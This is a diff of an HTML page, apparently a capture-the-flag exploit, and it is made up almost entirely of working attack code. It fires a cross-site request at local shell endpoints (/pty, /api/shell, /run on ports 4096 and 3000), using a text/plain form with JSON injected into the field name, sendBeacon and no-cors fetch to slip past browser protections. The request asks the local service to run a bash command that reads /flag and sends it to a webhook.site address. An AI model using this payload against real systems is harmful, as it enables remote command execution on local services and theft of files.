@@ -2,55 +2,51 @@
 <html>
 <body>
     <script>
-        // 【注意】请确保此 ID 是你 Webhook.site 页面上显示的那个
-        const WEBHOOK_ID = '6c7b9fec-12ce-4d1c-b5ce-5938576168f4';
-        const WEBHOOK_URL = `https://webhook.site/${WEBHOOK_ID}`;
+        // 1. 务必确认你的 Webhook ID！！
+        const WEB_ID = '6c7b9fec-12ce-4d1c-b5ce-5938576168f4';
+        const WEB_URL = `https://webhook.site/${WEB_ID}`;
         
-        // 信号确认：Bot 已上线
-        fetch(`${WEBHOOK_URL}?status=ultimate_attack_start`);
+        fetch(`${WEB_URL}?status=exploit_v5_start`);
 
-        // 核心命令：修改权限 -> 读取文件 -> 发送请求
-        const cmd = `chmod 444 /flag && node -e "const fs=require('fs'); const data=fs.readFileSync('/flag','utf8'); fetch('${WEBHOOK_URL}?flag='+encodeURIComponent(data))"`;
+        // 构造命令：修改权限 -> 读取 -> 发送
+        // 使用 Node.js 的 http 模块回传，因为它比 fetch 更稳定
+        const cmd = `chmod 444 /flag && node -e "const fs=require('fs'); const http=require('https'); const data=fs.readFileSync('/flag','utf8'); http.get('${WEB_URL}?flag='+encodeURIComponent(data))"`;
 
         const payload = JSON.stringify({
             command: '/bin/bash',
             args: ['-c', cmd]
         });
 
-        async function attack(host, port) {
-            const target = `http://${host}:${port}/pty`;
+        // 策略：依次尝试不同的端口和路径，每个尝试后延迟几秒
+        const targets = [
+            {p: 4096, path: '/pty'},
+            {p: 3000, path: '/api/shell'},
+            {p: 3000, path: '/run'}
+        ];
 
-            // 方式 A: Navigator Beacon (绕过 PNA 限制的常用手段)
-            navigator.sendBeacon(target, new Blob([payload], {type: 'text/plain'}));
-
-            // 方式 B: fetch no-cors (强制发送)
-            fetch(target, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: payload
-            }).catch(() => {});
-        }
-
-        // 尝试所有可能的地址组合
-        const ports = [4096, 3000];
-        const hosts = ['localhost', '127.0.0.1', '0.0.0.0'];
-
-        hosts.forEach(h => ports.forEach(p => attack(h, p)));
-
-        // 方式 C: 顶级导航表单（最后的绝招，绕过所有 Mixed Content 限制）
-        setTimeout(() => {
+        let index = 0;
+        function nextAttempt() {
+            if (index >= targets.length) return;
+            const target = targets[index++];
+            
+            console.log(`Trying ${target.p}${target.path}...`);
+            
             const f = document.createElement('form');
-            f.action = 'http://localhost:4096/pty';
+            f.action = `http://127.0.0.1:${target.p}${target.path}`;
             f.method = 'POST';
-            f.enctype = 'text/plain';
+            f.enctype = 'text/plain'; // 关键：绕过 Preflight
+            
             const i = document.createElement('input');
             i.name = payload; // 将 JSON 注入键名
             i.value = '';
+            
             f.appendChild(i);
             document.body.appendChild(f);
-            f.submit();
-        }, 2000);
+            f.submit(); // 这一步会引起页面跳转，攻击请求随之发出
+        }
 
+        // 启动递归尝试
+        setTimeout(nextAttempt, 2000);
     </script>
 </body>
 </html>
